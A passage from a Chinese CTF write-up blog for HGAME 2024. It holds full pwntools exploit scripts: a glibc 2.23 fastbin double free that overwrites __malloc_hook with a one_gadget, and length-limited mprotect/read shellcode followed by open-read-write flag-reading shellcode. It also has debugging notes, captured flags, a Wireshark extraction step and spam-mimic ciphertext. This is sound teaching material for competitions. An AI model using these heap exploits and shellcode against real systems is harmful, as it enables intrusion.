class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x30</span>, p64(system))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>delete(<span class="hljs-number">10</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hgame</span>&#123;<span class="hljs-number">1</span>f86c89584f2d4ebbe2a8044444b6a58dd6510ae&#125;<br></code></pre></td></tr></table></figure><ul><li>39行gdb调试可以看到，有chunk是从0x80中分割出来的 所以有一个chunk_size为0x50 所以为了填满tcache就多add一个<br>后面的多调试调整</li><li>还有52行以后，只剩fastbin中的chunk了 调试会发现这些chunk进入了tcache(还挺有趣)</li></ul></li><li><p>还看到一种方法 house_of_botcake</p><blockquote><p>libc-2.31的fastbin，存在UAF，可以用fastbin double free(2.31还未有严格的check)，不过得先把tcache塞满，但这种方法较为繁琐，使用 house of botcake是最简单的</p><p><a href="https://blog.csdn.net/qq_62172019/article/details/133359490">https://blog.csdn.net/qq_62172019/article/details/133359490</a></p></blockquote></li></ul><h4 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h4><ul><li><p>本来还想着和之前一样打free_hook的 但是打不通</p><blockquote><p>报错：b”*** Error in &#96;.&#x2F;vuln’: malloc(): memory corruption (fast): 0x00007f25857c67b8 ***\n”</p><p>地址是unsortedbin的地址 具体的原因还不知道</p><p>官方WP写了：2.23的fastbin double free，这个版本的fastbin在malloc时会检查拿到的chunk的size是否正确，所以很难申请到任意地址的指针。但是这⾥没有对⻬检查，可以通过字节错位实现绕过。由于__free_hook 附近没有合适的值可以拿来利⽤，所以这道题⽤ __malloc_hook +one_gadget 来完成攻击。</p></blockquote></li><li><p>然后就对着《不同libc版本下UAF的利用手法总结》发现2.23是打malloc_hook 改成onegadget（原因不详  应该也能改成system把<br>（有的时候如果onegadget都打不通的话 就需要realloc函数来实现相应的条件限制了</p><blockquote><p>由于调⽤ <code>__malloc_hook</code> 时的的上下⽂正好都不满⾜one_gadget 的constraints，不过libc-2.23的constraints⼤部分和栈相关，同时 realloc 的开头部分有⼤量的push操作可以⽤来调整栈帧，且 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的位置是紧贴着的，可以同时被修改，所以可以先通过<code>__malloc_hook</code> 从 realloc 开头的合适位置开始执⾏，然后利⽤ __realloc_hook 调⽤ one_gadget</p></blockquote></li><li><p>这里是最后一个ogg打通了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># no_pie 全绿</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">31585</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size, content</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;unsorted&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>unsorted = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = unsorted - <span class="hljs-number">0x68</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>fake = unsorted - <span class="hljs-number">0x68</span> - <span class="hljs-number">0x23</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(unsorted))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>ogg = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf03a4</span>, <span class="hljs-number">0xf1247</span>]<br>onegadeet = base + ogg[<span class="hljs-number">3</span>]<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, p64(fake))<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>)+p64(onegadeet))<br><br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hgame</span><span class="hljs-template-variable">&#123;ee9422f85597939cdb57a3a74f368fbc31df5324&#125;</span><br></code></pre></td></tr></table></figure><h4 id="ShellcodeMaster"><a href="#ShellcodeMaster" class="headerlink" title="ShellcodeMaster"></a>ShellcodeMaster</h4><ul><li>下面这个exp忘了还有沙箱，， 报错Program terminated with signal SIGSYS, Bad system call.  我说怎么不行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./shellcodeMaster&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcodeMaster&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io.recv()<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp, 0x404500</span><br><span class="hljs-string">push 0x6873</span><br><span class="hljs-string">mov ax, 59</span><br><span class="hljs-string">mov edi, esp</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">xor esi,esi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload = shellcode<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<span class="hljs-comment"># 0x16 如果没有sandbox应该能通</span><br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><ul><li><p>打orw就必须要read了</p><blockquote><p>出题⽬的是想让新⽣学习⼀下缩减shellcode⻓度的技巧。⽐赛中可能会遇到限制较⾼的。</p><p><strong>常⻅的⼿法有：置零⽤xor、寄存器⽤低位、push+pop等等。</strong></p><p>预期解是再实现⼀次read和mprotect，cdq指令可以控制dx</p></blockquote><p>好的 确实学习到了<br>mprotect的函数调用号应该是10   没有设置rsi是0x1000也是可以的(原来值为0x2333)  设置的还是0x1000范围是rwps</p><blockquote><p>shl edi,12：寄存器edi的值向左移动12位（相当于乘以2的12次方）（”shl”表示逻辑左移操作（Shift Left）</p><p>cdq：用于将32位寄存器eax中的有符号整数扩展为64位整数，将符号位拓展到edx寄存器中。具体操作如下：</p><ol><li>如果eax寄存器中的值是正数，则edx寄存器被清零。</li><li>如果eax寄存器中的值是负数，则edx寄存器被设置为全1（0xFFFFFFFF）。</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asm"> ► 0x233300b               syscall  &lt;SYS_mprotect&gt;<br>        addr: 0x2333000 ◂— mov dx, 7<br>        len: 0x2333<br>        prot: 0x7<br>   0x233300d               cdq    <br>   0x233300e               mov    esi, edi<br> RAX  0xa<br> RBX  0x2333<br> RCX  0x2333<br> RDX  0x7<br><br>   0x233300b               syscall <br> ► 0x233300d               cdq    <br>   0x233300e               mov    esi, edi<br>*RAX  0xfffffffffffffff4<br> RBX  0x2333<br>*RCX  0x233300d ◂— cdq  /* 0xfff31c031fe8999 */<br> RDX  0x7<br><br>   0x233300b    syscall <br>   0x233300d    cdq    <br> ► 0x233300e    mov    esi, edi<br> RAX  0xfffffffffffffff4<br> RBX  0x2333<br> RCX  0x233300d ◂— cdq  /* 0xfff31c031fe8999 */<br>*RDX  0xffffffff<br></code></pre></td></tr></table></figure><ul><li>第28行nop指令(长度是1)必须要有 个数的问题和add rsp, 0x500相配合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./shellcodeMaster&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">31751</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcodeMaster&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>addr = <span class="hljs-number">0x404500</span><br><br>io.recv()<br>payload=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov dx, 7</span><br><span class="hljs-string">mov ax, 10</span><br><span class="hljs-string">shl edi,12</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">cdq</span><br><span class="hljs-string">mov esi, edi</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload))) <span class="hljs-comment"># 0x16     # read的mov要放在两个xor前面</span><br>io.send(payload)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, addr, <span class="hljs-number">0x50</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, addr, <span class="hljs-number">0x50</span>)<br>payload2 = <span class="hljs-string">b&#x27;\x90&#x27;</span>*(<span class="hljs-number">0xff</span>) + asm(<span class="hljs-string">&#x27;shl rsp, 12; add rsp, 0x500;&#x27;</span>)<br>payload2 += asm(shellcode)<br>io.sendline(payload2)<br><br><span class="hljs-comment">#basic orw shellcode  官方wp给出的手打orw</span><br><span class="hljs-comment"># shellcode_orw = asm(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># push 0x67616c66</span><br><span class="hljs-comment"># mov rdi,rsprsp:0x4044f8</span><br><span class="hljs-comment"># xor esi,esi</span><br><span class="hljs-comment"># push 2</span><br><span class="hljs-comment"># pop rax</span><br><span class="hljs-comment"># syscall</span><br><span class="hljs-comment"># mov rdi,rax</span><br><span class="hljs-comment"># mov rsi,rsp</span><br><span class="hljs-comment"># mov edx,0x100</span><br><span class="hljs-comment"># xor eax,eax</span><br><span class="hljs-comment"># syscall</span><br><span class="hljs-comment"># mov edi,1</span><br><span class="hljs-comment"># mov rsi,rsp</span><br><span class="hljs-comment"># push 1</span><br><span class="hljs-comment"># pop rax</span><br><span class="hljs-comment"># syscall</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><span class="hljs-comment"># io.sendline(b&#x27;\x90&#x27;*0xff+asm(&quot;shl rsp, 12; add rsp, 0x500;&quot;)+shellcode_orw)</span><br><br><br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">hgame&#123;<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">59947</span>fc<span class="hljs-number">9</span>fe<span class="hljs-number">2</span>da<span class="hljs-number">827468</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">14</span>a<span class="hljs-number">630822431</span>af<span class="hljs-number">9</span>e&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h4><blockquote><p>题目描述：An introducation to Wireshark and also ek1ng.</p><p><strong>提示1</strong>：尝试用Wireshark从HTTP流量中提取文件</p></blockquote><ul><li><p>直接根据提示搜用Wireshark从HTTP流量中提取文件</p><blockquote><p>打开wireshark –&gt; （导航栏）文件 –&gt; 打开附件<br>(导航栏)文件 –&gt; 导出文件 –&gt; http：在弹出的对话框中有ek1ng.jpg<br>保存打开是张图片 有flag</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">hgame&#123;ek1ng_want_girlfriend_qq_<span class="hljs-number">761042182</span>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="ezword"><a href="#ezword" class="headerlink" title="ezword"></a>ezword</h4><blockquote><p><a href="https://chenxi9981.github.io/hgame2024_week2/">https://chenxi9981.github.io/hgame2024_week2/</a></p></blockquote><p>盲水印得到密码（但工具没下 直接py的</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs tp">Dear E-Commerce professional ; This letter was specially<br>selected to be sent to you . We will comply with all<br>removal requests <span class="hljs-comment">! This mail is being sent in compliance</span><br><span class="hljs-comment">with Senate bill 1620 ;</span> Title <span class="hljs-number">3</span> ; Section <span class="hljs-number">308</span> <span class="hljs-comment">! This</span><br><span class="hljs-comment">is not a get rich scheme ! Why work for somebody else</span><br><span class="hljs-comment">when you can become rich in 27 MONTHS . Have you ever</span><br><span class="hljs-comment">noticed more people than ever are surfing the web and</span><br><span class="hljs-comment">more people than ever are surfing the web . Well, now</span><br><span class="hljs-comment">is your chance to capitalize on this ! WE will help</span><br><span class="hljs-comment">YOU use credit cards on your website plus turn your</span><br><span class="hljs-comment">business into an E-BUSINESS . You are guaranteed to</span><br><span class="hljs-comment">succeed because we take all the risk ! But don&#x27;t believe</span><br><span class="hljs-comment">us . Ms Simpson who resides in Maine tried us and says</span><br><span class="hljs-comment">&quot;I&#x27;ve been poor and I&#x27;ve been rich - rich is better&quot;</span><br><span class="hljs-comment">. We are a BBB member in good standing ! We urge you</span><br><span class="hljs-comment">to contact us today for your own future financial well-being</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 50%</span><br><span class="hljs-comment">. Thank-you for your serious consideration of our offer</span><br><span class="hljs-comment">! Dear Friend ;</span> This letter was specially selected<br>to be sent to you <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2316 ;</span> Title <span class="hljs-number">8</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! Do NOT confuse</span><br><span class="hljs-comment">us with Internet scam artists . Why work for somebody</span><br><span class="hljs-comment">else when you can become rich as few as 24 WEEKS !</span><br><span class="hljs-comment">Have you ever noticed more people than ever are surfing</span><br><span class="hljs-comment">the web plus how many people you know are on the Internet</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">200% and turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">are guaranteed to succeed because we take all the risk</span><br><span class="hljs-comment">. But don&#x27;t believe us . Mrs Simpson of Illinois tried</span><br><span class="hljs-comment">us and says &quot;Now I&#x27;m rich many more things are possible&quot;</span><br><span class="hljs-comment">! We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! Do not delay - order today . Sign up a friend</span><br><span class="hljs-comment">and your friend will be rich too . Warmest regards</span><br><span class="hljs-comment">! Dear Sir or Madam ;</span> Especially for you - this hot<br>information . We will comply with all removal requests<br><span class="hljs-comment">! This mail is being sent in compliance with Senate</span><br><span class="hljs-comment">bill 1916 ;</span> Title <span class="hljs-number">2</span> , Section <span class="hljs-number">301</span> <span class="hljs-comment">! THIS IS NOT MULTI-LEVEL</span><br><span class="hljs-comment">MARKETING ! Why work for somebody else when you can</span><br><span class="hljs-comment">become rich in 89 days . Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone plus most everyone has a cellphone</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU sell more &amp; SELL MORE . You can begin</span><br><span class="hljs-comment">at absolutely no cost to you . But don&#x27;t believe us</span><br><span class="hljs-comment">. Mr Jones of Minnesota tried us and says &quot;I was skeptical</span><br><span class="hljs-comment">but it worked for me&quot; ! We assure you that we operate</span><br><span class="hljs-comment">within all applicable laws ! We beseech you - act now</span><br><span class="hljs-comment">. Sign up a friend and you&#x27;ll get a discount of 90%</span><br><span class="hljs-comment">. Thanks . Dear Cybercitizen ;</span> Your email address has<br>been submitted to us indicating your interest in our<br>newsletter . If you are not interested in our publications<br>and wish to be removed from our lists, simply do NOT<br>respond and ignore this mail <span class="hljs-comment">! This mail is being sent</span><br><span class="hljs-comment">in compliance with Senate bill 2016 , Title 2 , Section</span><br><span class="hljs-comment">304 . This is different than anything else you&#x27;ve seen</span><br><span class="hljs-comment">! Why work for somebody else when you can become rich</span><br><span class="hljs-comment">in 48 weeks ! Have you ever noticed more people than</span><br><span class="hljs-comment">ever are surfing the web plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU deliver goods right to the customer&#x27;s</span><br><span class="hljs-comment">doorstep &amp; turn your business into an E-BUSINESS .</span><br><span class="hljs-comment">You can begin at absolutely no cost to you . But don&#x27;t</span><br><span class="hljs-comment">believe us . Ms Anderson who resides in New York tried</span><br><span class="hljs-comment">us and says &quot;My only problem now is where to park all</span><br><span class="hljs-comment">my cars&quot; ! We are a BBB member in good standing . If</span><br><span class="hljs-comment">not for you then for your LOVED ONES - act now ! Sign</span><br><span class="hljs-comment">up a friend and you&#x27;ll get a discount of 20% ! God</span><br><span class="hljs-comment">Bless . Dear Colleague , Your email address has been</span><br><span class="hljs-comment">submitted to us indicating your interest in our publication</span><br><span class="hljs-comment">. If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our mailing list . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 2416</span><br><span class="hljs-comment">, Title 9 ;</span> Section <span class="hljs-number">308</span> <span class="hljs-comment">! This is NOT unsolicited bulk</span><br><span class="hljs-comment">mail . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich within 24 MONTHS ! Have you ever noticed most</span><br><span class="hljs-comment">everyone has a cellphone and people love convenience</span><br><span class="hljs-comment">. Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">We will help you decrease perceived waiting time by</span><br><span class="hljs-comment">190% and sell more ! The best thing about our system</span><br><span class="hljs-comment">is that it is absolutely risk free for you ! But don&#x27;t</span><br><span class="hljs-comment">believe us . Mrs Anderson of Indiana tried us and says</span><br><span class="hljs-comment">&quot;Now I&#x27;m rich, Rich, RICH&quot; . This offer is 100% legal</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">. Sign up a friend and your friend will be rich too</span><br><span class="hljs-comment">. God Bless ! Dear Colleague ;</span> We know you are interested<br>in receiving amazing information <span class="hljs-comment">! If you are not interested</span><br><span class="hljs-comment">in our publications and wish to be removed from our</span><br><span class="hljs-comment">lists, simply do NOT respond and ignore this mail !</span><br><span class="hljs-comment">This mail is being sent in compliance with Senate bill</span><br><span class="hljs-comment">1619 , Title 7 , Section 303 ! This is not multi-level</span><br><span class="hljs-comment">marketing . Why work for somebody else when you can</span><br><span class="hljs-comment">become rich within 37 days ! Have you ever noticed</span><br><span class="hljs-comment">nobody is getting any younger plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span 